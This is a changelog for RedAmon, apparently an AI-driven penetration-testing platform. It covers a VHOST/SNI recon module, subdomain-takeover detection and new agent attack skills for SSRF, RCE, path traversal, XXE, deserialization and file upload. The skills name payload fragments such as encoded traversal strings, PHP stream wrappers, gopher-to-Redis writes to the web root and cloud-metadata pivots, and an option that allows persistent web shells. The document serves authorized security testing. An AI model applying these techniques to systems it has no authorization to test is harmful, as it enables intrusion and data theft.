- **11 new project settings** ([recon/project_settings.py:200-211, 816-826](recon/project_settings.py#L200-L211)) -- `VHOST_SNI_ENABLED` (master, default `false`), `VHOST_SNI_TEST_L7` (default `true`), `VHOST_SNI_TEST_L4` (default `true`, https-only), `VHOST_SNI_TIMEOUT` (3s connect, max-time scales to 9s), `VHOST_SNI_CONCURRENCY` (20 workers per IP), `VHOST_SNI_BASELINE_SIZE_TOLERANCE` (50 bytes), `VHOST_SNI_MAX_CANDIDATES_PER_IP` (2,000), `VHOST_SNI_INJECT_DISCOVERED` (true), `VHOST_SNI_USE_DEFAULT_WORDLIST` (true), `VHOST_SNI_USE_GRAPH_CANDIDATES` (true), `VHOST_SNI_CUSTOM_WORDLIST` (empty string). Stealth mode override at [project_settings.py:1396](recon/project_settings.py#L1396) sets `VHOST_SNI_ENABLED=False` outright -- the bare-IP curl probes plus per-candidate retries are too noisy for stealth profiles. Parameter total 266+ -> 277+


### Changed

- **GROUP 6 Phase A fan-out** ([recon/main.py:1356-1395](recon/main.py#L1356-L1395)) -- `phase_a_tools` dict now scales 1 -> 4 workers based on which scanners are enabled (`vuln_scan`, `graphql_scan`, `subdomain_takeover`, `vhost_sni`). Each phase-A tool still writes its result to `combined_result[key]`, appends to `metadata.modules_executed`, persists to disk, and graph-updates via `_graph_update_bg("update_graph_from_<key>")` as its future completes; failures remain isolated to `metadata.phase_errors[key]`. Phase B (MITRE) stays unchanged

### Notes

- **Minor version bump** (4.2.2 -> 4.3.0) -- new top-level recon module + 11 new project settings + new partial-recon tool + new graph mixin + new Prisma columns. No breaking changes: existing projects pick up `VHOST_SNI_ENABLED=false` by default, so the module is dormant until explicitly enabled per-project. Required commands after pulling: `docker compose exec webapp npx prisma db push` (new columns), webapp rebuild only in production mode (`docker compose -f docker-compose.yml -f docker-compose.dev.yml up -d webapp` hot-reloads in dev), `docker compose build agent && docker compose up -d agent` (the new graph mixin is COPY-baked into the agent image; spawned scan containers pick up `graph_db/` via volume mount). Recon container does not need rebuild -- `recon_orchestrator` volume-mounts the source, and `recon/` is spawned fresh per scan. The default wordlist is shipped in-repo so no extra fetch step is needed

---

## [4.2.2] - 2026-04-25

### Added

- **Three new Built-in Agent Skills** wired through all 9 layers (Python prompts, package re-exports, phase injection, classification, project settings defaults, Prisma schema, project-form section, drawer tooltip, suggestion prompts) so each appears in the Intent Router, the project Agent Skills tab, the chat-drawer skill badge, and the example-prompt dropdown:
  - **Server-Side Request Forgery (SSRF)** -- classification key `ssrf`, badge **SSRF** (orange `#f97316`). End-to-end SSRF testing covering classic / blind / semi-blind variants, OAST oracle setup via `interactsh-client`, internal address probing, cloud-metadata pivots (AWS IMDSv1 + IMDSv2 PUT-then-GET, GCP `metadata.google.internal` with `Metadata-Flavor: Google`, Azure IMDS, DigitalOcean, Alibaba), protocol smuggling (`gopher://` to Redis with `SLAVEOF`/`CONFIG SET dir`/RDB-write to web root, `dict://` banner grabs, `file://`, FastCGI, Docker socket via `unix://`), and DNS rebinding via `1u.ms`/`nip.io`/`rbndr.us`. Workflow file [agentic/prompts/ssrf_prompts.py](agentic/prompts/ssrf_prompts.py). 11 per-skill tunables (`SSRF_OOB_CALLBACK_ENABLED`, `SSRF_CLOUD_METADATA_ENABLED`, `SSRF_GOPHER_ENABLED`, `SSRF_DNS_REBINDING_ENABLED`, `SSRF_PAYLOAD_REFERENCE_ENABLED`, `SSRF_REQUEST_TIMEOUT`, `SSRF_PORT_SCAN_PORTS`, `SSRF_INTERNAL_RANGES`, `SSRF_OOB_PROVIDER`, `SSRF_CLOUD_PROVIDERS`, `SSRF_CUSTOM_INTERNAL_TARGETS`) covering all three dynamic-prompt patterns: format-string injection (timeout, ports, CIDRs, OOB provider), conditional sub-section append (cloud metadata, gopher, DNS rebinding, payload reference), and pre-rendered swap blocks. Promoted from the previously-shipped community skill `ssrf_exploitation.md` -- the community file is removed because the built-in is strictly more capable
  - **Remote Code Execution (RCE) / Command Injection** -- classification key `rce`, badge **RCE** (rose `#f43f5e`). Six primitives in one coherent skill: shell-metachar command injection (commix), server-side template injection (sstimap across Jinja2 / Twig / Freemarker / Velocity / EJS / Thymeleaf), insecure deserialization gadget chains (ysoserial Java, .NET BinaryFormatter / TypeNameHandling, PHP unserialize, Python pickle, Ruby Marshal, Jackson / FastJSON typing), eval / OGNL / SpEL / MVEL expression injection, media + document pipeline RCE (ImageMagick / Ghostscript / ExifTool / LaTeX), and SSRF-to-RCE chains (Redis, FastCGI, Docker socket). OWASP-aligned 4-stage rigor framework (Confirmation -> Fingerprint -> Targeted Exfiltration -> Critical Impact) with a Shannon-derived false-positive gate. Workflow file [agentic/prompts/rce_prompts.py](agentic/prompts/rce_prompts.py). Three tunables: `RCE_OOB_CALLBACK_ENABLED` (interactsh DNS+HTTP oracle for blind detection), `RCE_DESERIALIZATION_ENABLED` (per-language gadget sub-section), and the swap-block `RCE_AGGRESSIVE_PAYLOADS` (default `False` = read-only proofs, `True` permits Stage 4 file write / persistent web shells / container-escape probes with mandatory cleanup)
  - **Path Traversal / LFI / RFI** -- classification key `path_traversal`, badge **PATH** (teal `#14b8a6`). File-disclosure testing covering classic `../` traversal + encoded variants (`%2e%2e%2f`, `%252f` double-decode, `..%c0%af`), absolute paths, nginx alias bypasses (`..;/`), Local File Inclusion, Remote File Inclusion via `http://` / `ftp://`, PHP wrapper-driven source disclosure (`php://filter/convert.base64-encode/`, `data://`, `expect://`, `zip://`, `phar://`), log poisoning to RCE, /proc and cloud-credential file reads, parser/normalisation mismatches, and archive-extraction Zip Slip / TarSlip. Same OWASP 4-stage rigor framework + false-positive gate. Workflow file [agentic/prompts/path_traversal_prompts.py](agentic/prompts/path_traversal_prompts.py). Six tunables: `PATH_TRAVERSAL_OOB_CALLBACK_ENABLED`, `PATH_TRAVERSAL_PHP_WRAPPERS_ENABLED` (sub-section toggle), `PATH_TRAVERSAL_ARCHIVE_EXTRACTION_ENABLED` (default `False` because Zip Slip writes files to the target), `PATH_TRAVERSAL_PAYLOAD_REFERENCE_ENABLED`, `PATH_TRAVERSAL_REQUEST_TIMEOUT`, `PATH_TRAVERSAL_OOB_PROVIDER`
- **Eight new Community Agent Skills** dropped into [agentic/community-skills/](agentic/community-skills/) -- volume-mounted read-only into the agent container at [docker-compose.yml:419](docker-compose.yml#L419), so no rebuild is needed. Each includes the canonical structure: opening summary paragraph (auto-extracted as the import-dialog description per [agentic/api.py:572-578](agentic/api.py#L572-L578)), explicit "When to Classify Here" with disjointness against every neighboring built-in and community skill, phase-numbered Workflow with the literal "request transition to exploitation phase" cue at the end of Phase 1, Reporting Guidelines, and Important Notes. All workflows reference real agent tools only (`query_graph`, `kali_shell`, `execute_curl`, `execute_code`, `execute_playwright`, `execute_ffuf`, `execute_arjun`, `interactsh-client`):
  - **[XXE](agentic/community-skills/xxe.md)** -- XML External Entity exploitation across XML / SOAP / SAML / RSS / SVG / Office document parsers: DOCTYPE/entity probing, XInclude and XSLT abuse, blind exfiltration via parameter entities and external DTDs, billion-laughs / quadratic-blowup, SOAP/SAML/RSS surface-specific payloads, SVG/OOXML upload pivots
  - **[IDOR / BOLA Exploitation](agentic/community-skills/idor_bola_exploitation.md)** -- Object-level authorization testing (IDOR, BOLA, cross-tenant access) driven by a two-identity swap methodology across REST, GraphQL, WebSocket, gRPC, batch endpoints, job objects, and signed object-storage URLs. Subject x object x action matrix, Relay node-ID swap, response-diff oracle for blind enumeration, race-window ID flip
  - **[Broken Function-Level Authorization (BFLA)](agentic/community-skills/bfla_exploitation.md)** -- Vertical privilege escalation, transport drift across REST / GraphQL / gRPC / WebSocket, gateway header trust, route shadowing, content-type parser confusion, background-job replay. Actor x action matrix, verb / version / transport bypass exhaustion, identity-header tampering, persisted-query and per-message authz tests, OWASP-aligned 4-tier proof framework. Disjoint from `idor_bola_exploitation` via the heuristic "ID swap = idor_bola, function gate bypass = bfla"
  - **[Server-Side Template Injection (SSTI)](agentic/community-skills/ssti.md)** -- Black-box template-engine fingerprinting + sandbox escape across Jinja2, Twig, Freemarker, Velocity, EJS, Thymeleaf, Smarty, Mako, Pebble, Handlebars, Pug. Per-engine confirmation oracles, polyglot probes, sandbox-escape gadgets, OAST oracle for blind SSTI, sstimap fallback for long workflows. Distinct from the built-in `rce` skill: SSTI is the engine-specific deep-dive when `rce` would only run sstimap one-shot
  - **[Insecure Deserialization](agentic/community-skills/insecure_deserialization.md)** -- Java / PHP / Python / .NET / Ruby gadget chains via ysoserial, phpggc, pickle, BinaryFormatter, Marshal. URLDNS oracle, Apache Shiro key-bruteforce, PHAR JPG polyglots, Jackson / FastJSON typing, Rails Marshal cookies. Distinct from the built-in `rce` skill: this is a focused, format-driven workflow (decode the wire format, pick gadgets, deliver) vs. `rce`'s broader six-primitive coverage
  - **[Mass Assignment](agentic/community-skills/mass_assignment.md)** -- Privileged-field injection, ownership takeover, feature-gate and billing tampering across REST, GraphQL, JSON Patch, multipart, batch writes. Per-resource sensitive-field dictionary via arjun, shape and Content-Type rotation, GraphQL input overpost with re-read, race-window normalization, capability proof step
  - **[Subdomain Takeover](agentic/community-skills/subdomain_takeover.md)** -- Dangling CNAME / orphaned NS / dangling MX / unverified provider claim across S3, GitHub Pages, Heroku, Vercel, Netlify, Azure, CloudFront, Fastly, Shopify and ~80 more providers. subzy + nuclei takeover corpus + manual fingerprint table, NS-delegation reclaim, OAuth redirect / cookie-Domain / CSP trust-chain proof, CT log evidence, scoped cache-poisoning chain
  - **[Insecure File Uploads](agentic/community-skills/insecure_file_uploads.md)** -- Web shells, SVG/HTML stored XSS, magic-byte and config-drop bypass, ImageMagick / Ghostscript / ExifTool toolchain abuse, zip slip and zip bombs, presigned-URL tampering, resumable-finalize swaps, AV processing-race. Polyglot crafting via `execute_code`, `.htaccess` / `.user.ini` / `web.config` drops, S3 POST policy bypass, tus and S3 multipart late-stage swap, EICAR + processor-latency race oracle, header-driven inline render, real-browser playwright XSS proof
- **Per-skill test files** for every new skill ([agentic/tests/test_ssrf_skill.py](agentic/tests/test_ssrf_skill.py), [agentic/tests/test_rce_skill.py](agentic/tests/test_rce_skill.py), [agentic/tests/test_path_traversal_skill.py](agentic/tests/test_path_traversal_skill.py), [agentic/tests/test_bfla_skill.py](agentic/tests/test_bfla_skill.py), [agentic/tests/test_idor_bola_community_skill.py](agentic/tests/test_idor_bola_community_skill.py), [agentic/tests/test_insecure_deserialization_skill.py](agentic/tests/test_insecure_deserialization_skill.py), [agentic/tests/test_insecure_file_uploads_skill.py](agentic/tests/test_insecure_file_uploads_skill.py), [agentic/tests/test_subdomain_takeover_skill.py](agentic/tests/test_subdomain_takeover_skill.py), and the cross-cutting [agentic/tests/test_community_skills.py](agentic/tests/test_community_skills.py)) covering: state registration in `KNOWN_ATTACK_PATHS`, classification-prompt rendering with the skill enabled vs. disabled, `_BUILTIN_SKILL_MAP` and `_CLASSIFICATION_INSTRUCTIONS` wiring, `DEFAULT_AGENT_SETTINGS` defaults, prompt-template formatting (every `{placeholder}` resolves; conditional sub-sections appear only when their gate is set; swap-block selection is exclusive), markdown structure (canonical sections present, phase-transition cue at end of Phase 1, no em dashes, no invented agent tools, fallback notes for any tool not in the Kali image), and live integration against the agent container's `/community-skills` and `/community-skills/<id>` endpoints. Mutation tests confirm the assertions actually bite (em-dash injection, missing transition cue, invented `execute_*` token in a fenced code block all fail the relevant test)

### Changed

- **Wiki documentation** -- [redamon.wiki/Agent-Skills.md](redamon.wiki/Agent-Skills.md) updated end-to-end: TOC adds the three new built-ins; the Overview type table and at-a-glance summary table re-numbered 1-11 (was 1-8) with the new SSRF / RCE / PATH rows and refreshed user-skill examples (XXE, BFLA, IDOR, mass assignment, subdomain takeover); the classification flow diagram gains decision branches for SSRF / RCE / Path Traversal; three full Built-in Skills subsections added (classification key, badge, tool list, numbered workflow, OOB / sub-workflow notes, Project Settings table, worked example) sourced directly from `DEFAULT_AGENT_SETTINGS`; Community Skills table drops the stale `ssrf_exploitation` row (promoted to built-in) and gains rows for `bfla_exploitation` and `ssti`. All 14 in-page TOC anchors verified to resolve to a real `###` header
- **README** ([README.md:538](README.md#L538)) -- Agent Skills paragraph rewritten so the built-in list reads "CVE (MSF), SQL Injection, XSS, SSRF, RCE, Path Traversal / LFI / RFI, Credential Testing, Social Engineering, Availability Testing" (5 -> 9 skills) and the community list reads "API testing, XSS, SQLi, XXE, BFLA, SSTI, IDOR / BOLA, insecure deserialization, mass assignment, subdomain takeover, insecure file uploads" (4 -> 11 skills, with the stale SSRF row removed)
- **`KNOWN_ATTACK_PATHS`** ([agentic/state.py](agentic/state.py)) extended with `ssrf`, `rce`, `path_traversal` so the Pydantic `AttackPathClassification` validator accepts the new classifier outputs
- **`_BUILTIN_SKILL_MAP` + `_CLASSIFICATION_INSTRUCTIONS`** ([agentic/prompts/classification.py](agentic/prompts/classification.py)) gain entries for the three built-ins; both ordered lists in `build_classification_prompt()` updated so the sections render in deterministic order
- **`_inject_builtin_skill_workflow()`** ([agentic/prompts/__init__.py](agentic/prompts/__init__.py)) gains three `elif` branches with phase guards (`"execute_curl" in allowed_tools` for SSRF, `"kali_shell" in allowed_tools` for RCE, `"execute_curl" in allowed_tools` for Path Traversal), each resolving its tunables via `get_setting(...)` and applying the relevant dynamic-prompt pattern (format-string for SSRF + Path Traversal, swap-block for RCE's `RCE_AGGRESSIVE_PAYLOADS`, conditional sub-sections for the OOB / cloud / wrapper / deserialization blocks across all three)
- **`ATTACK_SKILL_CONFIG.builtIn`** ([agentic/project_settings.py](agentic/project_settings.py)) gains `ssrf: True`, `rce: True`, `path_traversal: True` defaults; `DEFAULT_AGENT_SETTINGS` gains 11 + 3 + 6 = 20 new tunables across the three skills, plus matching camelCase mappings in `fetch_agent_settings`
- **Prisma schema** ([webapp/prisma/schema.prisma](webapp/prisma/schema.prisma)) -- `attackSkillConfig` JSON default extended with the three new keys; per-project columns added for every tunable (`ssrf_oob_callback_enabled`, `ssrf_cloud_metadata_enabled`, ..., `path_traversal_archive_extraction_enabled`, ...) with `@map("snake_case")` and explicit `@default(...)` values matching `DEFAULT_AGENT_SETTINGS`
- **Frontend wiring** -- [AttackSkillsSection.tsx](webapp/src/components/projects/ProjectForm/sections/AttackSkillsSection.tsx) `BUILT_IN_SKILLS` array gains entries for the three skills with `Globe` / `Terminal` / `FolderTree` `lucide-react` icons; [SsrfSection.tsx](webapp/src/components/projects/ProjectForm/sections/SsrfSection.tsx) added (sub-section component matching the SQLi / DoS / Hydra / Phishing pattern) for SSRF's 11 tunables; [phaseConfig.ts](webapp/src/app/graph/components/AIAssistantDrawer/phaseConfig.ts) gains badge configs for `ssrf` (orange), `rce` (rose), `path_traversal` (teal); [available/route.ts](webapp/src/app/api/users/[id]/attack-skills/available/route.ts) `BUILT_IN_SKILLS` array updated so the chat-drawer skills tooltip lists the three new entries; [suggestionData.ts](webapp/src/app/graph/components/AIAssistantDrawer/suggestionData.ts) `EXPLOITATION_GROUPS` gains `SESubGroup` blocks for `ssrf` / `rce` / `path_traversal` with 4-6 ready-to-send example prompts each
- **Kali sandbox image** ([mcp/kali-sandbox/Dockerfile](mcp/kali-sandbox/Dockerfile)) -- per-skill review confirmed every tool referenced in the new SSRF / RCE / Path Traversal workflows is already present (`commix`, `sstimap`, `ysoserial`, `interactsh-client`, `ffuf`, `httpx`, `arjun`, `jwt_tool`, `graphql-cop`, `graphqlmap`); `tool_registry.py` `kali_shell` description block updated to list these alongside the existing `sqlmap` / `dalfox` / `nuclei` mentions

### Removed

- **`agentic/community-skills/ssrf_exploitation.md`** -- the previously-shipped community SSRF skill is removed; SSRF is now a strictly more capable Built-in Agent Skill (with badge, per-project settings UI, drawer suggestion prompts, and 11 tunables) so the community version would only confuse classification. Existing users who imported the community skill will continue to see the imported `UserAttackSkill` row until they delete it from Global Settings; new users get the built-in by default

### Notes

- **Patch version bump** (4.2.1 -> 4.2.2) -- additive content release, no breaking changes. Existing projects pick up the three new built-in skills with their default toggles (`ssrf=true`, `rce=true`, `path_traversal=true`) the next time `attackSkillConfig` is read; existing rows whose stored JSON predates the new keys are treated as "enabled" only on the `user` side -- for the `builtIn` side the missing keys are absent, so run the standard one-line SQL backfill if you want existing projects to inherit the new defaults: `docker compose exec webapp npx prisma db execute --stdin <<<'UPDATE projects SET attack_skill_config = jsonb_set(attack_skill_config::jsonb, $${builtIn,ssrf}$$, $$true$$::jsonb, true)'` (and the same for `rce` / `path_traversal`). Required commands after pulling: `docker compose build agent && docker compose up -d agent` (Python source is baked into the agent image), `docker compose exec webapp npx prisma db push` (new columns), webapp rebuild only in production mode (`docker compose -f docker-compose.yml -f docker-compose.dev.yml up -d webapp` hot-reloads in dev). The eight new community skills require **no rebuild** -- the directory is volume-mounted read-only -- they appear immediately in `GET /community-skills` and become importable from Global Settings > Agent Skills > Import from Community

---

## [4.2.1] - 2026-04-25

### Fixed

- **Target lists are now a union, not a cascade**, across Nuclei and the resource_enum chain (Katana, Hakrawler, FFuf, Kiterunner) in both global and partial recon. Previously a first-hit cascade would silently drop newly-discovered subdomains whenever httpx had returned any URL; now the list is `httpx BaseURLs ∪ resource_enum endpoints ∪ http(s)://<sub> for any subdomain not yet covered`, deduplicated with case-insensitive host matching
- **IPv6 IPs** in target URLs now bracketed per RFC 3986 (`http://[::1]/`) instead of malformed `http://::1/`
- **Nuclei JSON-format stats line** no longer leaks into "Nuclei warnings" on non-zero exits
- **Partial-recon phase counter** pinned to `1/1` (was showing `5/1` because the full-pipeline phase pattern table assigned phase 5 to Nuclei)
- **SSE log stream** resumes via Docker `since=` on reconnect; frontend dedup safety net catches any second-granular boundary slip

### Changed

- **`NUCLEI_DAST_MODE` default flipped to `false`** (Prisma + recon settings); UI now warns when DAST is enabled and explains it filters templates rather than adding them, with guidance on which tags work in DAST mode
- **Nuclei progress heartbeat** via `-stats -stats-interval 30` so long scans emit progress every 30s instead of going silent; subprocess output streams line-by-line so the heartbeat reaches the container log in real time
- **Workflow tooltips** rewritten to describe the union behavior (Nuclei, Katana, Hakrawler, FFuf, Kiterunner) and widened from 680px to 900px to fit the new explanations
- **`_build_http_probe_data_from_graph`** extended with DNS data (apex Domain IPs, Subdomain IPs) so partial crawlers can run the same union as the global pipeline

### Added

- **54 new tests** (`recon/tests/test_target_helpers_union.py`) covering the union helper: unit, regression, contract, integration (real subprocess), invariants, IPv6 brackets, status-code boundaries, port handling, idempotency, non-mutation, stress at 1000 hostnames

---

## [4.2.0] - 2026-04-21

### Added

- **Subdomain Takeover Detection module** (`recon/main_recon_modules/subdomain_takeover.py` + `recon/helpers/takeover_helpers.py` + `graph_db/mixins/recon/takeover_mixin.py`) -- three-engine layered scanner that finds dangling DNS records whose third-party target can still be claimed by an attacker (expired Heroku apps, decommissioned S3 buckets, dead GitHub Pages, orphaned NS delegations, etc.). Runs as a third parallel sibling in **GROUP 6 Phase A** alongside Nuclei and the GraphQL scanner -- all three consume shared inputs (`Domain`/`Subdomain`/`BaseURL`/alive URLs) and emit `Vulnerability` nodes with zero data dependency, so the Phase A fan-out becomes a 3-way `ThreadPoolExecutor(max_workers=3)` with `run_subdomain_takeover_isolated()` deep-copying `combined_result` to avoid dict races. Disabled by default via `SUBDOMAIN_TAKEOVER_ENABLED`. Key components:
  - **Subjack layer** (Apache-2.0 Go binary baked into the recon image via a dedicated `golang:1.25-alpine` Stage 1d builder in `recon/Dockerfile`, `go install github.com/haccer/subjack@latest` copied to `/usr/local/bin/subjack`) -- DNS-first CNAME/NS/MX fingerprinting with compiled-in service signatures. Flags wired: `-w` (targets file), `-t` (threads), `-timeout`, `-o` (JSON output), `-ssl` (force HTTPS probes), `-a` (test every URL, not only CNAME-bearing ones), `-ns` (NS takeovers), `-ar` (stale A records), `-mail` (SPF/MX takeovers). Output parser handles both JSON-array and NDJSON formats (subjack switches shape across versions). Hard cap via `SUBJACK_RUN_TIMEOUT` (default 900 s) prevents pathological target sets from stalling the pipeline. Non-vulnerable rows are filtered out in the normalizer (`normalize_subjack_result` keeps only `vulnerable=true`)
  - **Nuclei takeover templates layer** -- reuses the existing `projectdiscovery/nuclei:latest` image via Docker-in-Docker but forces `-t http/takeovers/ -t dns/` so only ~60 takeover-focused templates fire instead of the full 9,000+ community set. Targets are restricted to httpx-alive URLs (`http_probe.by_url` entries with `status_code < 500` plus per-host `live_urls` lists) -- dead hosts stay with Subjack/BadDNS. Critical behavioral difference vs main Nuclei: global `NUCLEI_EXCLUDE_TAGS` is **not inherited** here (would accidentally drop the `takeover` tag and neuter the layer) and interactsh is always off (takeover templates don't need OOB). Filter by `TAKEOVER_SEVERITY` (default `critical,high,medium`), rate limit via `TAKEOVER_RATE_LIMIT` (default 50 req/s, independent from the main vuln-scan rate). Only findings whose tags/template-id include `takeover`, `dangling`, or `detect-dangling-cname` survive the normalizer; other categories (CVE, misconfig) are discarded
  - **BadDNS AGPL-3.0 isolated sidecar** (`baddns_scan/Dockerfile` + `baddns_scan/entrypoint.sh`, new `redamon-baddns:latest` image built via `docker compose --profile tools build baddns-scanner`) -- deep multi-module DNS audit running inside its own Docker image with `baddns==2.1.0` pinned. **License-safe pattern**: RedAmon Python never imports baddns; the recon container spawns the sidecar via Docker-in-Docker (`docker run --rm --name redamon-baddns-<pid>-<ts> -v <work>:/work:ro redamon-baddns:latest <targets> <modules> <resolvers>`) and receives NDJSON on stdout. Process + filesystem boundary enforces the AGPL-3.0 separation (documented in `THIRD-PARTY-LICENSES.md`). Batch entrypoint (`/usr/local/bin/baddns-batch`, bash script) iterates targets with a per-target timeout (`BADDNS_PER_TARGET_TIMEOUT`, default 90 s) so one hanging target can't stall the batch, forwards SIGTERM/SIGINT to the child so `docker kill` exits promptly, runs as a non-root `baddns` user with home `/work`, and emits a summary line (`scanned=.. skipped=.. findings=..`) on stderr for orchestrator logs. 10 CLI-addressable modules (MTA-STS excluded because baddns 2.1.0's `validate_modules` regex rejects hyphens, documented inline): `cname`, `ns`, `mx`, `txt`, `spf`, `dmarc`, `wildcard`, `nsec` (NSEC-walking, slow), `references` (HTML link audit), `zonetransfer` (AXFR, slow). Default enabled subset is `cname,ns,mx,txt,spf`. Unknown module strings are silently filtered at command-build time to prevent argparse-level baddns failures. Optional custom DNS resolvers via `BADDNS_NAMESERVERS` (-n). Hard cap via `BADDNS_RUN_TIMEOUT` (default 1800 s); on timeout the orphan container is reaped via `docker kill <container_name>` so the host doesn't accumulate zombies (subprocess.run kills only the docker CLI, not the daemon-owned container -- hence the explicit --name + kill pattern)
  - **Provider fingerprinting** (`PROVIDER_FROM_SIGNAL` in `takeover_helpers.py`) -- canonical slug table with ~40 signal mappings and ~30 CNAME-suffix patterns covering GitHub Pages, Heroku, AWS S3/CloudFront/Elastic Beanstalk, Azure App Service/Blob/Traffic Manager/Cloud Services, Shopify, Fastly, Ghost, Zendesk, Tumblr, Unbounce, Readthedocs, Surge, Netlify, Vercel, Pantheon, Webflow, Statuspage, Desk, Helpjuice, Helpscout, Intercom, Bitbucket, Campaign Monitor, Pingdom, Kajabi, Tilda, Cargo, Tictail, Teamwork, WordPress, Uservoice, and more. `provider_from_signal()` handles Subjack `service` fields + Nuclei `template-id` substrings; `provider_from_cname()` does longest-match CNAME-suffix matching as a fallback (used when provider is `unknown` after tool-reported signals). **Auto-exploitable providers** (12 entries: `github-pages`, `heroku`, `aws-s3`, `shopify`, `fastly`, `ghost`, `unbounce`, `readthedocs`, `surge`, `webflow`, `tumblr`, `statuspage`) earn a +20 confidence bonus because a claim is a single-step registration with no verification challenge
  - **Deduplication + scoring** (`dedupe_findings`, `score_finding`) -- findings from all three engines are merged on `(hostname, takeover_provider, takeover_method)`; merged records carry `sources` (ordered tool list), `confirmation_count`, `raw_by_source` (JSON-preserved per-tool payload for provenance), and prefer Subjack's evidence string when Subjack fires alongside Nuclei (higher precision). Additive scoring rules: **+30** confirmed by 2+ tools, **+25** Subjack flagged as vulnerable, **+20** provider in auto-exploitable list, **+15** Nuclei template match, **+10** method = `cname` (most reliable), **-15** method = `stale_a` or `mx` (probabilistic), **-10** provider = `unknown`. Score clamped to `[0, 100]`, then mapped to a **verdict**: `>= threshold + 10` -> `confirmed`, `>= threshold` -> `likely`, otherwise `manual_review` (threshold default 60 via `TAKEOVER_CONFIDENCE_THRESHOLD`). **Severity mapping**: `confirmed` -> `high` (or nuclei-assigned severity if present), `likely` -> `medium` (or nuclei-assigned), `manual_review` -> `info` by default so it doesn't pollute the main alert stream. `TAKEOVER_MANUAL_REVIEW_AUTO_PUBLISH=true` promotes manual_review from `info` to `medium` so every unverified candidate surfaces in the findings table
  - **Deterministic finding IDs** -- `finding_id(hostname, provider, method)` returns `takeover_<sha1_16>` so rescans MERGE onto the same `Vulnerability` node in Neo4j instead of duplicating (`first_seen` set on create, `last_seen` moves on every run)
  - **Shared work directory** -- runner allocates `tempfile.mkdtemp(prefix="redamon_takeover_", dir="/tmp/redamon")` (bind-mounted between recon container and host) so Docker-in-Docker sibling containers (nuclei, baddns) see the same paths. Directory is chmod 755 so the non-root baddns user inside the sidecar can read targets files; cleanup is guaranteed via `try/finally + shutil.rmtree(ignore_errors=True)`
  - **Target collection** (`_collect_subdomains`, `_collect_alive_urls`) -- subdomains pulled from `recon_data.dns.subdomains` keys + flat `subdomains` list + project apex (`recon_data.domain` / `metadata.target`); alive URLs pulled from `http_probe.by_url` (status_code < 500) and `http_probe.by_host[*].live_urls`. CNAME fallback lookup (`_lookup_cname_from_dns`) resolves `unknown` providers against the existing DNS map before the scoring pass
  - **Output structure** -- `combined_result.subdomain_takeover.{findings[], by_target{hostname: [finding,...]}, summary.{total, confirmed, likely, manual_review, by_provider{}}, scan_metadata.{subjack_enabled, nuclei_takeovers_enabled, confidence_threshold, subdomains_scanned, alive_urls_scanned, duration_sec, scan_timestamp}}`. Each finding carries `id`, `hostname`, `cname_target`, `takeover_provider`, `takeover_method`, `confidence`, `verdict`, `severity`, `sources`, `confirmation_count`, `evidence`, `raw_by_source`, `detected_at`
- **21 new project settings** (`recon/project_settings.py` + Prisma `webapp/prisma/schema.prisma` + `webapp/src/components/projects/ProjectForm/sections/TakeoverSection.tsx`) -- `SUBDOMAIN_TAKEOVER_ENABLED` (master, default `false`), Subjack block (`SUBJACK_ENABLED` default `true`, `SUBJACK_THREADS` 10, `SUBJACK_TIMEOUT` 30, `SUBJACK_SSL` `true`, `SUBJACK_ALL` `false`, `SUBJACK_CHECK_NS` `false`, `SUBJACK_CHECK_AR` `false`, `SUBJACK_CHECK_MAIL` `false`, `SUBJACK_RUN_TIMEOUT` 900), Nuclei takeover block (`NUCLEI_TAKEOVERS_ENABLED` `true`, `NUCLEI_TAKEOVER_RUN_TIMEOUT` 1800), scoring block (`TAKEOVER_SEVERITY` `["critical","high","medium"]`, `TAKEOVER_CONFIDENCE_THRESHOLD` 60, `TAKEOVER_RATE_LIMIT` 50, `TAKEOVER_MANUAL_REVIEW_AUTO_PUBLISH` `false`), BadDNS block (`BADDNS_ENABLED` `false` opt-in, `BADDNS_DOCKER_IMAGE` `redamon-baddns:latest`, `BADDNS_MODULES` `["cname","ns","mx","txt","spf"]`, `BADDNS_NAMESERVERS` `[]`, `BADDNS_RUN_TIMEOUT` 1800). Parameter total 245+ -> 266+. New `TakeoverSection.tsx` UI panel with scanner toggles, BadDNS module pill grid (10 buttons with hover tooltips), severity chip selector, confidence slider (0-100, step 5), rate-limit + threads number inputs, and an auto-publish toggle
- **Graph DB mixin** (`graph_db/mixins/recon/takeover_mixin.py`, wired into `graph_db/mixins/recon_mixin.py` and exposed as `Neo4jClient.update_graph_from_subdomain_takeover()`) -- writes one `Vulnerability` node per deduped finding with `source="takeover_scan"`, `type="subdomain_takeover"`, deterministic `id`, and full property payload (`hostname`, `cname_target`, `takeover_provider`, `takeover_method`, `confidence`, `sources[]`, `confirmation_count`, `verdict`, `severity`, `evidence` trimmed to 2,000 chars, `tool_raw` JSON-encoded per-source raw payload trimmed to 50,000 chars, `matched_at`, `host`, `is_dast_finding=false`, `first_seen`, `last_seen`). MERGE-driven so rescans update in place. **Three-tier anchor attachment logic**: (1) attach to existing `(:Subdomain {name: hostname, user_id, project_id})` via `HAS_VULNERABILITY`; (2) if no Subdomain exists and hostname matches the apex, attach to `(:Domain)` instead; (3) otherwise create a defensive `Subdomain` node with `source="takeover_scan"` so the `Vulnerability` is always reachable from the graph page (mirrors how `vuln_mixin` treats orphan discoveries). Returns per-run stats dict (`vulnerabilities_created`, `relationships_created`, `errors[]`)
- **Partial Recon support** (`recon/partial_recon_modules/vulnerability_scanning.py::run_subdomain_takeover_partial`, wired into `recon/partial_recon.py`'s dispatcher under `tool_id == "SubdomainTakeover"`) -- Subdomain Takeover added as a partial-recon tool, bringing total pipeline tools runnable in isolation to 22. Modal accepts user-provided custom subdomains validated against project scope (entry must equal the apex or end with `.<apex>` -- out-of-scope entries rejected with a log warning). Dangling subdomains with no A/AAAA are still scanned because they are the prime takeover candidates. `SUBDOMAIN_TAKEOVER_ENABLED` is force-set to `true` for partial runs regardless of project toggle; `settings_overrides` from the modal bypass stored settings. User subdomains are resolved via system resolver and defensively MERGED as `(:Subdomain {source: "partial_recon_user_input"})` before findings attach, so `HAS_VULNERABILITY` has a valid anchor. Rescans converge on the same `Vulnerability.id` deterministically. Webapp `PARTIAL_RECON_SUPPORTED_TOOLS` set updated (`webapp/src/lib/recon-types.ts`); `PartialReconModal` targets mapping includes `SubdomainTakeover: ['Subdomain Takeover Detection']`
